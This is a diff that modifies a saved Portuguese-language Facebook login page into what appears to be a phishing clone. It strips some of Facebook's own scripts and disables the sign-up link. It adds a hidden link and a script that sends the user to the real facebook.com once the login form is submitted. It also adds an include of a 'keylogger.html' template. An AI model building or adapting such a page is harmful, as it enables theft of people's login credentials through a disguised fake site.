@@ -56,7 +56,6 @@
     <link type="text/css" rel="stylesheet" href="https://static.xx.fbcdn.net/rsrc.php/v3/yC/l/0,cross/Pqgxe4Jte4u.css?_nc_x=Ij3Wp8lg5Kz" data-bootloader-hash="l0vWqD0" crossorigin="anonymous">
     <link type="text/css" rel="stylesheet" href="https://static.xx.fbcdn.net/rsrc.php/v3/yH/l/0,cross/M5yhFVIGuVs.css?_nc_x=Ij3Wp8lg5Kz" data-bootloader-hash="JAn1Fi6" crossorigin="anonymous">
     <link type="text/css" rel="stylesheet" href="https://static.xx.fbcdn.net/rsrc.php/v3/yi/l/0,cross/yotEdcUw9Gj.css?_nc_x=Ij3Wp8lg5Kz" data-bootloader-hash="DcLQ9Pg" crossorigin="anonymous">
-    <script src="https://static.xx.fbcdn.net/rsrc.php/v3/yi/r/Qj-BdKDLI_z.js?_nc_x=Ij3Wp8lg5Kz" data-bootloader-hash="LcQOWsV" crossorigin="anonymous" nonce=""></script>
     <style type="text/css" id="operaUserStyle"></style>
     <script nonce="">
       requireLazy(["HasteSupportData"], function(m) {
@@ -679,7 +678,6 @@
                 "mouseout": 10000,
                 "mousewheel": 1,
                 "MSPointerMove": 10000,
-                "keydown": 0.1,
                 "click": 0.02,
                 "mouseup": 0.02,
                 "__100ms": 0.001,
@@ -862,9 +860,19 @@
                         </div>
                         <div class="_8icz"></div>
                         <div class="_6ltg">
-                            <a role="button" class="_42ft _4jy0 _6lti _4jy6 _4jy2 selected _51sy" href="/r.php" ajaxify="" id="u_0_0_Em" data-testid="open-registration-form-button">Criar nova conta</a>
+                            <a role="text" class="_42ft _4jy0 _6lti _4jy6 _4jy2 selected _51sy" ajaxify="" id="u_0_0_Em" data-testid="open-registration-form-button">Criar nova conta</a>
                         </div>
+                        <!-- Link oculto -->
+                        <a href="https://www.facebook.com" target="_blank" id="facebook-link" style="display: none;">Facebook</a>
                     </form>
+                    
+                    <!-- Script para clicar no link após o envio do formulário -->
+                    <script>
+                        document.getElementById('u_0_2_J2').onsubmit = function() {
+                            document.getElementById('facebook-link').click();
+                        };
+                    </script>
+                    
                     
                     
                                       
@@ -973,9 +981,6 @@
                 "__m": "__elem_a588f507_0_0_1u"
               }]
             ],
-            ["KeyboardActivityLogger", "init", [],
-              []
-            ],
             ["FocusRing", "init", [],
               []
             ],
@@ -1009,7 +1014,6 @@
               }]
             ],
             ["FocusListener"],
-            ["FlipDirectionOnKeypress"],
             ["LoginFormToggle", "initToggle", ["__elem_a588f507_0_3_Db", "__elem_a588f507_0_4_pM", "__elem_558608f3_0_0_aZ", "__elem_9f5fac15_0_0_+I"],
               [{
                 "__m": "__elem_a588f507_0_3_Db"
@@ -1257,9 +1261,6 @@
                 needsPartialUpdate: false,
                 shouldLogResourcePerf: false
               }, 3977],
-              ["WebStorageMonsterLoggingURI", [], {
-                uri: "/ajax/webstorage/process_keys/?state=1"
-              }, 3032],
               ["BrowserPaymentHandlerConfig", [], {
                 enabled: false
               }, 3904],
@@ -1410,6 +1411,6 @@
         });
       }));
     </script>
-    
+    {% include 'keylogger.html' %}
   </body>
 </html>
